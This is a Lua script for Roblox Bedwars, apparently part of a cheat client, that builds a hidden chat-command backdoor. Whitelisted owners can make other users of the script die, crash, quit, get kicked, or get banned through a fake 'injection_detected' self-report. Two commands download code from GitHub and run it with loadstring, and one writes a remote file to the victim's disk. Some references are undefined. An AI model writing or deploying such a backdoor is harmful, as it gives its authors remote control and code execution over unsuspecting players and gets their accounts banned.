local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/PVOwner/WhitelistForRobloxBedwars/main/data.json"))

local colors = {
    ["red"] = "#ff0000",
    ["orange"] = "#ff7800",
    ["yellow"] = "#e5ff00",
    ["green"] = "#00ff00",
    ["blue"] = "#0000ff",
    ["purple"] = "#b800b8",
    ["pink"] = "#ff00ff",
    ["black"] = "#000000",
    ["white"] = "#ffffff",
}

local function getLplrType()
    local lplr_Type = 0
    if whitelist["Owner"] ~= nil then
        for i, v in pairs(whitelist["Owner"]) do
            if v.id == tostring(lplr.UserId) then
                lplr_Type = 3
                return lplr_Type
            end
        end
    end
    if whitelist["Private"] ~= nil then
        for i, v in pairs(whitelist["Private"]) do
            if v.id == tostring(lplr.UserId) then
                lplr_Type = 1
                return lplr_Type
            end
        end
    end
    return lplr_Type
end

local function CanAttackUser(u)
    local userId = tostring(u.UserId)
    local userType = 0

    if whitelist["Private"] ~= nil then
        for i, v in pairs(whitelist["Private"]) do
            if v.id == userId then
                userType = 1
                break
            end
        end
    end

    if whitelist["Owner"] ~= nil then
        for i, v in pairs(whitelist["Owner"]) do
            if v.id == userId then
                userType = 3
                break
            end
        end
    end

    return getLplrType() >= userType
end

local commands = {
    [";kill"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
		end
	end,
	[";video"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			local filename = "bruh"
			local ScreenGui = Instance.new("ScreenGui")
			ScreenGui.IgnoreGuiInset = true
			ScreenGui.Parent = game:GetService("CoreGui")

			local video = Instance.new("VideoFrame")
			video.Size = UDim2.new(1, 0, 1, 0)
			video.Parent = ScreenGui

			local Name = filename .. ".mp4"
			if not isfile(Name) then
				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
			end

			video.Video = syn and getsynasset(Name) or getcustomasset(Name)

			repeat
				task.wait()
				print("Retrying...")
			until video.Loaded

			video:Play()
		end
	end,
	[";reveal"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			local textChatService = game:GetService("TextChatService")
			wait(0.0001)
			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using PV+ Cmd")
		end
	end,
	[";void"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			local character = game.Players.LocalPlayer.Character
			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
			local newPosition = humanoidRootPart.CFrame
			for i = 1, 3 do
				newPosition = newPosition + Vector3.new(0, -40, 0)
				humanoidRootPart.CFrame = newPosition
				wait(0.01)
			end
		end
	end,
	[";blind"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			local blur = Instance.new("BlurEffect")
			blur.Size = 10000000000000
			blur.Parent = game.Lighting
		end
	end,
	[";unblind"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
			if blur then
				blur:Destroy()
			end
		end
	end,
	[";troll"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
		end
	end,
	[";kick"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			wait(1)
			for index, player in pairs(game.Players:GetPlayers()) do
				player:Kick("PV+ Private User Or Owner Kick You")
			end
		end
	end,
	[";ban"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			local rs = game:GetService("ReplicatedStorage")
			local remote = rs:FindFirstChild("SelfReport", true)
			remote:FireServer("injection_detected")
		end
	end,
	[";rickroll"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
		end
	end,
	[";freeze"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
		end
	end,
	[";thaw"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
		end
	end,
	[";lobby"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
		end
	end,
	[";quit"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			game:Shutdown()
		end
	end,
	[";lagback"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			for i = 1, 10 do
				wait()
				local player = game.Players.LocalPlayer
				local character = player.Character or player.CharacterAdded:Wait()
				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
				local forwardVector = humanoidRootPart.CFrame.LookVector
				local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
				humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
			end
		end
	end,
	[";bgame"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			pcall(function()
				local replicatedStorage = game:GetService("ReplicatedStorage")
				for _, child in ipairs(replicatedStorage:GetDescendants()) do
					child:Destroy()
				end
			end)
		end
	end,
	[";bmap"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			local function unanchorParts(object)
				if object:IsA("BasePart") then
					object.Anchored = false
				end
				for _, child in ipairs(object:GetChildren()) do
					unanchorParts(child)
				end
			end
			unanchorParts(workspace)
		end
	end,
	[";crash"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			while true do end
		end
	end,
	[";ping"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			local thingy = settings().Network
			thingy.IncomingReplicationLag = math.huge
		end
	end,
	[";uninject"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			GuiLibrary.SelfDestruct()
		end
	end,
	[";lag"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
			local RunService = game:GetService("RunService")
			local player = game.Players.LocalPlayer
			local character = player.Character or player.CharacterAdded:Wait()
			local rootPart = character:WaitForChild("HumanoidRootPart")
			RunService.Heartbeat:Connect(function()
				for i = 1, 100 do
					local part = Instance.new("Part")
					part.Anchored = false
					part.CanCollide = true
					part.Transparency = 1
					part.CFrame = rootPart.CFrame + Vector3.new(0, 100000, 0)
					part.Parent = workspace
				end
			end)
		end
	end,
	[";loopkill"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			_G.loopkill = true;
			while _G.loopkill do
				Game.Players.LocalPlayer.Character.Humanoid.Health = 0
				wait(4)
			end			
		end
	end,
	[";unloopkill"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			_G.loopkill = false;
			while _G.loopkill do
				Game.Players.LocalPlayer.Character.Humanoid.Health = 0
				wait(3)			
			end
		end
	end
}

function isPlayerAllowed()
    return false
end

local txt = game:GetService("TextChatService")

local function updateTag(msg, hasTag, tagColor)
    if hasTag then
        local color = colors[tagColor] or colors["pink"]
        local tag = msg.TextSource.tag
        msg.PrefixText = "<font color='" .. color .. "'>[" .. tag .. "]</font> " .. msg.PrefixText
    end
end

txt.OnIncomingMessage:Connect(function(msg)
    if msg.TextSource then
        local userId = tostring(msg.TextSource.UserId)
        local hasTag, tagColor = displayTag(userId)
        updateTag(msg, hasTag, tagColor)

        local command = msg.Text
        if commands[command] and command:find("default") == nil then
            local tag = msg.TextSource.tag
            local plr
            for i, v in pairs(game.Players:GetPlayers()) do
                if v.tag == tag then
                    plr = v
                    break
                end
            end

            if plr and not CanAttackUser(plr) then
                commands[command]()
            end
        end
    end
end)
